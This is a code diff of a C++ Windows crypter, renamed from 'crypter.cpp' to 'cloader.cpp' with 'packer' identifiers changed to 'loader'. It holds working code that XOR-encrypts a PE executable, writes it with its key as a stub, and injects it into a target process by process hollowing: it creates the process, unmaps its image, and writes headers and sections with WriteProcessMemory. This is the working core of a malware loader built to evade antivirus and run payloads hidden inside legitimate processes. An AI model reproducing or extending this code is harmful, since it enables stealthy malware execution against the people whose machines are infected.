@@ -1,5 +1,5 @@
 /**
- * crypter.cpp
+ * cloader.cpp
  */
 
 #include <iostream>
@@ -7,7 +7,7 @@
 #include <cstdlib>
 #include <time.h>
 #include <windows.h>
-#include "packer.hpp"
+#include "loader.hpp"
 
 typedef long (*unmap_view_fn)(void *, void *);
 
@@ -29,13 +29,13 @@ typedef struct proc {
     CONTEXT thread_ctx;
 } proc_t;
 
-void module_init(module_t *pem, packer_t *packer);
+void module_init(module_t *pem, loader_t *loader);
 
 int proc_init(proc_t *proc, const std::string &target);
 int proc_create_hollow(proc_t *proc, void *image_base);
 int proc_allocate(module_t *pem, proc_t *proc, void **alloc_base);
-int proc_write_sections(proc_t *proc, module_t *pem, packer_t *packer);
-int proc_write_headers( proc_t *proc, module_t *pem, packer_t *packer);
+int proc_write_sections(proc_t *proc, module_t *pem, loader_t *loader);
+int proc_write_headers( proc_t *proc, module_t *pem, loader_t *loader);
 
 #ifdef _WIN64
 int proc_unmap_view_of_section(proc_t *proc, unsigned long long addr);
@@ -43,11 +43,11 @@ int proc_unmap_view_of_section(proc_t *proc, unsigned long long addr);
 int proc_unmap_view_of_section(proc_t *proc, unsigned long addr);
 #endif
 
-int packer_read_file(packer_t *packer, const std::string &filename)
+int loader_read_file(loader_t *loader, const std::string &filename)
 {
     srand(time(0));
     for (int i = 0; i < KEY_SIZE; ++i) {
-        packer->key[i] = (char)rand();
+        loader->key[i] = (char)rand();
     }
 
     std::ifstream ifs;
@@ -57,17 +57,17 @@ int packer_read_file(packer_t *packer, const std::string &filename)
     }
 
     ifs.seekg(0, std::ios::end);
-    packer->size = ifs.tellg();
+    loader->size = ifs.tellg();
     ifs.seekg(0, std::ios::beg);
 
-    packer->bytes = (char*)malloc(sizeof(char) * (packer->size));
-    ifs.read(packer->bytes, packer->size);
+    loader->bytes = (char*)malloc(sizeof(char) * (loader->size));
+    ifs.read(loader->bytes, loader->size);
 
     ifs.close();
     return 1;
 }
 
-int packer_read_stub(packer_t *packer, const std::string &filename)
+int loader_read_stub(loader_t *loader, const std::string &filename)
 {
     std::ifstream ifs;
     ifs.open(filename, std::ios::in | std::ios::binary);
@@ -76,18 +76,18 @@ int packer_read_stub(packer_t *packer, const std::string &filename)
     }
 
     ifs.seekg(0, std::ios::end);
-    packer->size = ifs.tellg();
+    loader->size = ifs.tellg();
     ifs.seekg(0, std::ios::beg);
 
-    packer->bytes = (char*)malloc(sizeof(char) * (packer->size));
-    ifs.read(packer->key, KEY_SIZE);
-    ifs.read(packer->bytes, packer->size - KEY_SIZE);
+    loader->bytes = (char*)malloc(sizeof(char) * (loader->size));
+    ifs.read(loader->key, KEY_SIZE);
+    ifs.read(loader->bytes, loader->size - KEY_SIZE);
 
     ifs.close();
     return 1;
 }
 
-int packer_write_file(packer_t *packer, const std::string &filename)
+int loader_write_file(loader_t *loader, const std::string &filename)
 {
     std::ofstream ofs;
     ofs.open(filename, std::ios::out | std::ios::binary);
@@ -95,13 +95,13 @@ int packer_write_file(packer_t *packer, const std::string &filename)
         return 0;
     }
 
-    ofs.write(packer->bytes, packer->size);
+    ofs.write(loader->bytes, loader->size);
 
     ofs.close();
     return 1;
 }
 
-int packer_write_stub(packer_t *packer, const std::string &filename)
+int loader_write_stub(loader_t *loader, const std::string &filename)
 {
     std::ofstream ofs;
     ofs.open(filename, std::ios::out | std::ios::binary);
@@ -109,31 +109,31 @@ int packer_write_stub(packer_t *packer, const std::string &filename)
         return 0;
     }
 
-    ofs.write(packer->key, KEY_SIZE);
-    ofs.write(packer->bytes, packer->size);
+    ofs.write(loader->key, KEY_SIZE);
+    ofs.write(loader->bytes, loader->size);
 
     ofs.close();
     return 1;
 }
 
-void packer_encrypt(packer_t *packer)
+void loader_encrypt(loader_t *loader)
 {
-    for (size_t i = 0; i < packer->size; ++i) {
-        packer->bytes[i] = packer->bytes[i] ^ packer->key[i % KEY_SIZE];
+    for (size_t i = 0; i < loader->size; ++i) {
+        loader->bytes[i] = loader->bytes[i] ^ loader->key[i % KEY_SIZE];
     }
 }
 
-void packer_decrypt(packer_t *packer)
+void loader_decrypt(loader_t *loader)
 {
-    for (size_t i = 0; i < packer->size; ++i) {
-        packer->bytes[i] = packer->bytes[i] ^ packer->key[i % KEY_SIZE];
+    for (size_t i = 0; i < loader->size; ++i) {
+        loader->bytes[i] = loader->bytes[i] ^ loader->key[i % KEY_SIZE];
     }
 }
 
-int packer_inject(packer_t *packer, const std::string &target)
+int loader_inject(loader_t *loader, const std::string &target)
 {
     module_t pem;
-    module_init(&pem, packer);
+    module_init(&pem, loader);
 
     proc_t proc;
     if (!proc_init(&proc, target)) {
@@ -160,12 +160,12 @@ int packer_inject(packer_t *packer, const std::string &target)
         return 0;
     }
 
-    if (!proc_write_headers(&proc, &pem, packer)) {
+    if (!proc_write_headers(&proc, &pem, loader)) {
         std::cerr << "error: unable to write headers" << std::endl;
         return 0;
     }
 
-    if (!proc_write_sections(&proc, &pem, packer)) {
+    if (!proc_write_sections(&proc, &pem, loader)) {
         std::cerr << "error: unable to write sections" << std::endl;
         return 0;
     }
@@ -178,17 +178,17 @@ int packer_inject(packer_t *packer, const std::string &target)
     return 1;
 }
 
-void packer_free(packer_t *packer)
+void loader_free(loader_t *loader)
 {
-    free(packer->bytes);
-    packer->bytes = NULL;
-    packer->size = 0;
+    free(loader->bytes);
+    loader->bytes = NULL;
+    loader->size = 0;
 }
 
-void module_init(module_t *pem, packer_t *packer)
+void module_init(module_t *pem, loader_t *loader)
 {
-    pem->dos_header = (IMAGE_DOS_HEADER *)packer->bytes;
-    pem->nt_headers = (IMAGE_NT_HEADERS *)((LONG_PTR)packer->bytes +
+    pem->dos_header = (IMAGE_DOS_HEADER *)loader->bytes;
+    pem->nt_headers = (IMAGE_NT_HEADERS *)((LONG_PTR)loader->bytes +
             pem->dos_header->e_lfanew);
 
 #ifdef _WIN64
@@ -267,19 +267,19 @@ int proc_allocate(module_t *pem, proc_t *proc, void **alloc_base)
     return 1;
 }
 
-int proc_write_headers(proc_t *proc, module_t *pem, packer_t *packer)
+int proc_write_headers(proc_t *proc, module_t *pem, loader_t *loader)
 {
     /* write headers to target process */
     size_t read;
     if (!WriteProcessMemory(proc->info.hProcess, (void *)pem->base,
-            (void *)packer->bytes, pem->opt_header->SizeOfHeaders, &read)) {
+            (void *)loader->bytes, pem->opt_header->SizeOfHeaders, &read)) {
         return 0;
     }
 
     return 1;
 }
 
-int proc_write_sections(proc_t *proc, module_t *pem, packer_t *packer)
+int proc_write_sections(proc_t *proc, module_t *pem, loader_t *loader)
 {    
     /* calculate offset to sections headers */
     unsigned long offset = (pem->dos_header->e_lfanew +
@@ -290,9 +290,9 @@ int proc_write_sections(proc_t *proc, module_t *pem, packer_t *packer)
         /* retrieve current section header */
         IMAGE_SECTION_HEADER section = *(IMAGE_SECTION_HEADER*)(
 #ifdef _WIN64
-                (unsigned long long)packer->bytes +
+                (unsigned long long)loader->bytes +
 #else
-                (unsigned long)pe->data +
+                (unsigned long)loader->bytes +
 #endif
                 offset + sizeof(IMAGE_SECTION_HEADER) * i);
 
@@ -303,7 +303,7 @@ int proc_write_sections(proc_t *proc, module_t *pem, packer_t *packer)
         /* write raw data to section */
         size_t read;
         if (!WriteProcessMemory(proc->info.hProcess, section_ptr,
-                (void *)(packer->bytes + section.PointerToRawData),
+                (void *)(loader->bytes + section.PointerToRawData),
                 section.SizeOfRawData, &read)) {
             return 0;
         }
